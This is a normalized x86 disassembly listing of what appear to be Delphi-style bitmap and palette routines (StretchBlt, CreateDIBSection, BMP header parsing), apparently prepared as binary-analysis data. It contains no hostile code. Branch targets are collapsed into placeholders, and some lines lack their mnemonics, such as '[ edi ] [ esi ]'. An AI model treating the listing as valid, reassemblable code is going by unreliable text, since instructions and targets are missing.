push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_420610
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_41fe50
mov eax [ ebp - 0x8 ]
call sub_41b6ec
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4039c0
call sub_403a14
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_41fe7c
push ebx
mov ebx eax
mov eax ebx
call sub_420170
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40ccd0
pop ebx
retn
sub_41feac
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_415714
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_4203a0
lea eax [ ebx + 0x2c ]
call sub_40ccd0
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_420610
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_41ff20
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41d604
mov eax ebx
call sub_4204b0
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_4202ac
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_42015c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_41d530
push eax
call SetStretchBltMode
mov eax ebx
call sub_4201f0
mov dl [ r-xdata ]
call sub_41d604
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_420450
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_4201f0
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420163
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4200f1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_41d91c
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_4201f0
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41dac0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_420170
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_4203b0
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_41fdbc
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_41d874
sub_4201f0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_4203b0
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ef8c
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_41fe7c
sub_420238
push ebx
mov ebx eax
mov eax ebx
call sub_4203a0
mov eax ebx
call sub_4203b0
mov edx ebx
mov eax ebx
call sub_41fe7c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_42025c
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_4202dc
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_41bfbc
mov eax ebx
call sub_4202ac
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_4201f0
xor edx edx
pop ecx
call sub_41d4bc
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_42032c
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_4204b0
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_41f354
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_4203b0
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_4156b0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_420433
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_420450
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_4203a0
mov eax ebx
call sub_4203b0
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_4202dc
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_41fa1c
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_41ef10
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_4204b0
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_41e00c
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_41ef10
push 0x0
call GetDC
call sub_41d91c
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_420568
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_41d7f0
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_41fdbc
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_4203a0
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402c40
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_4205ec
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_415690
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_420ca0
pop esi
pop ebx
retn
sub_420610
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420697
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_4033d4
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4206f7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_41f184
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_41f180
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4206fe
push rw-data
call LeaveCriticalSection
retn
sub_420710
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_420ca0
pop edx
pop edi
pop esi
pop ebx
retn
sub_420738
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026bc
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_420c55
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_420c28
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402c40
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_41d808
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41592c
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402c40
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_4158bc
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_41da8c
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41daac
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_4158bc
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_41d91c
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_420ba3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_41dd54
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026bc
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_420b0b
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_4158bc
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_41d91c
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_420adf
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41e00c
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40c774
call sub_41d808
jmp r-xdata
xor eax eax
push ebp
push sub_420b72
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_4158bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420ae6
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420baa
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40c774
call sub_41d808
jmp r-xdata
sub_420ae6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026dc
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_420baa
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402c40
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_420c3f
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41e00c
mov [ ebp - 0x30 ] eax
sub_420c5c
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_420610
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_420ca0
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_4203a0
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_4158bc
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402c40
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_420610
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_420738
call sub_41d808
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_420d10
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_4203a0
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402c40
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_41f9b8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_420dab
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_420610
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420dd4
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_42025c
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_4203a0
mov eax esi
call sub_4204b0
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_4203a0
mov eax esi
call sub_4204b0
mov eax esi
call sub_42032c
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_41f9b8
mov ebp eax
